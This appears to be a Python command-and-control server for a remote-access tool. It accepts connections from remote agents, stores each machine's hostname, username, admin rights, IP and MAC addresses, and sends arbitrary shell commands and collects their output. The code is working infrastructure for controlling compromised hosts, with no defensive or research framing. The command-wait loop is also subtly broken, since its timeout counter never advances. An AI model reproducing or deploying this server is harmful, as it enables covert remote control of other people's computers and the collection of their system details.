import socket
import threading
import json
import time
import uuid
import os
import logging
from typing import Type, Any
from db.engine import Engine
from db.models import agents_table, agent_id, status
from db.query import Insert, Select, Update
from logs import logger



class Server:
    def __init__(self, db_engine_class: Type[Engine], buffer_size: int = 1024) -> None:
        self.db_engine_class: Type[Engine] = db_engine_class
        self.BUFFER_SIZE: int = buffer_size
        self.socket: socket.socket | None = None
        self.is_running: bool = False
        self.host: str | None = None
        self.port: int | None = None
        self.server_thread: threading.Thread | None = None

        self.MAX_TIMEOUT: int = 65
        self.MAX_CONNECTIONS: int = 1

        self.connected_agents: dict[str, socket.socket] = {}
        self.pending_command_responses: dict[str, dict] = {}

    def start(self, host: str = "0.0.0.0", port: int = 8080) -> None:

        if self.is_running:
            logger.error("Server is already running.")
            return

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((host, port))
        self.socket.listen(self.MAX_CONNECTIONS)

        self.is_running = True
        self.host = host
        self.port = port

        logging.info(f"Server successfully started on {host}:{port}.")

        # Accept new connection in separate thread
        self.server_thread = threading.Thread(target=self.accept_new_connections)
        self.server_thread.daemon = True
        self.server_thread.start()

    def stop(self) -> None:

        if not self.is_running:
            logger.error("Server isn't running.")
            return

        if self.socket:
            try:
                for agent_socket in self.connected_agents.values():
                    agent_socket.close()

                self.connected_agents = {}
                self.socket.close()
                self.socket = None
                self.is_running = False
                logger.info("Server stopped successfully.")

            except Exception as e:
                logger.error(f"Error closing server socket: {e}")

    def accept_new_connections(self) -> None:

        while self.is_running:
            try:
                client_socket, address = self.socket.accept()
                logger.info(f"New connection from {address[0]}:{address[1]}.")

                # Handle new connection in a separate thread
                thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address)
                )
                thread.daemon = True
                thread.start()
            except socket.timeout:
                continue
            except Exception as e:
                if self.is_running:
                    raise Exception(e)

    def handle_client(self, client_socket: socket.socket, address: tuple[str, int]):

        logger.info(f"Stated handling new connection: {address[0]}:{address[1]}.")
        db_engine_thread = self.db_engine_class()
        db_engine_thread.open(os.getenv("DB_PATH"))
        agent_uuid = None

        try:
            client_socket.settimeout(self.MAX_TIMEOUT)  # Set timeout.

            raw_data: str = client_socket.recv(self.BUFFER_SIZE).decode()
            initial_connection_info: dict = json.loads(raw_data)

            agent_uuid = initial_connection_info.get("agent_id")
            if agent_uuid is None:
                agent_uuid = str(uuid.uuid4())

            current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            data = {
                "agent_id": agent_uuid,
                "name": initial_connection_info.get("hostname", "unknown"),
                "connection_time": current_time,
                "host": address[0],
                "port": str(address[1]),
                "status": True,

                "hostname": initial_connection_info.get("hostname", "unknown"),
                "cwd": initial_connection_info.get("cwd", "unknown"),
                "os_name": initial_connection_info.get("os_name", "unknown"),
                "os_version": initial_connection_info.get("os_version", "unknown"),
                "os_architecture": initial_connection_info.get("os_architecture", "unknown"),
                "local_ip": initial_connection_info.get("local_ip", "unknown"),
                "public_ip": initial_connection_info.get("public_ip", "unknown"),
                "mac_address": initial_connection_info.get("mac_address", "unknown"),
                "is_admin": initial_connection_info.get("is_admin", "unknown"),
                "username": initial_connection_info.get("username", "unknown")
            }

            # Check if agent exists in the database
            select = Select(agents_table).where((agent_id == agent_uuid))
            exists = list(db_engine_thread.execute(select))

            if exists:
                logger.info("Agent already exists, updating connection.")
                # Update existing agent
                update = Update(agents_table).set(data).where(agent_id == agent_uuid)
                db_engine_thread.execute(update)
            else:
                logger.info("Agent not found, creating new one.")
                # Insert new agent
                insert = Insert(agents_table).values([data])
                db_engine_thread.execute(insert)
                logger.info(f"New agent stored to agent table in db {address[0]}:{address[1]}, agent ID: {agent_uuid}.")

            # Send back the agent_uid
            client_socket.send(json.dumps(agent_uuid).encode())
            db_engine_thread.commit()

            # Store agent socket
            self.connected_agents[agent_uuid] = client_socket
            logger.info(f"Agent {agent_uuid} is connected and online.")

            # Communication loop
            while self.is_running:
                try:
                    data_received = client_socket.recv(self.BUFFER_SIZE).decode()
                    if not data_received:  # Agent disconnected.
                        break

                    response = json.loads(data_received)
                    if response.get("type") == "command_response":
                        self.pending_command_responses[response["command_id"]] = response
                        logging.info(f"Received command response from agent {agent_uuid}.")
                    elif response.get("type") == "heartbeat":  # Heartbeat from agent to keep the connection alive.
                        logging.info(f"Server heartbeat received from agent {agent_uuid}.")
                        pass

                except socket.timeout:  # If didn't receive command or heartbeat, agent offline.
                    break
                except Exception as e:
                    logger.error(f"Unexpected error in handle_client loop: {e}")
                    break

        except Exception as e:
            logging.error(logging.ERROR, f"Error handling client {address[0]}:{address[1]}: {e}")
        finally:
            if agent_uuid:
                # Update agent status to offline in the database
                self._set_agent_offline(agent_uuid)

                # Remove agent from the active connections dictionary
                if agent_uuid in self.connected_agents:
                    del self.connected_agents[agent_uuid]

                logger.info(f"Agent {agent_uuid} has disconnected.")
            client_socket.close()
            db_engine_thread.close()

    def interact_with_agent(self, agent_uid: str, command: str) -> dict[str, bool | None] | None:

        try:
            command_id = str(uuid.uuid4())
            agent_socket = self.connected_agents[agent_uid]
            if not agent_socket:
                self._set_agent_offline(agent_uid)
                return {
                    "status": False,
                    "command_response": None,
                    "cwd": None,
                }
            data = {
                "command_id": command_id,
                "command": command,
            }
            agent_socket.send(json.dumps(data).encode())  # Send command.
            print(f"Sent command to agent {agent_uid}: {command}.")

            elapsed = 0
            while command_id not in self.pending_command_responses and elapsed < self.MAX_TIMEOUT:  # Wait for the response to be received.
                time.sleep(0.05)

            response_data = self.pending_command_responses.pop(command_id)
            if response_data:
                return {
                    "status": True,
                    "command_response": response_data.get("command_response"),
                    "cwd": response_data.get("cwd"),
                }

            self._set_agent_offline(agent_uid)
            return {
                "status": False,
                "command_response": None,
                "cwd": None,
            }
        except Exception as e:
            print(f"Unexpected error in handle_client loop: {e}")

    def _set_agent_offline(self, agent_uuid: str) -> None:

        db_engine_thread = self.db_engine_class()
        db_engine_thread.open(os.getenv("DB_PATH"))

        update_query = Update(agents_table).set({status: False}).where(agent_id == agent_uuid)
        db_engine_thread.execute(update_query)

        db_engine_thread.commit()
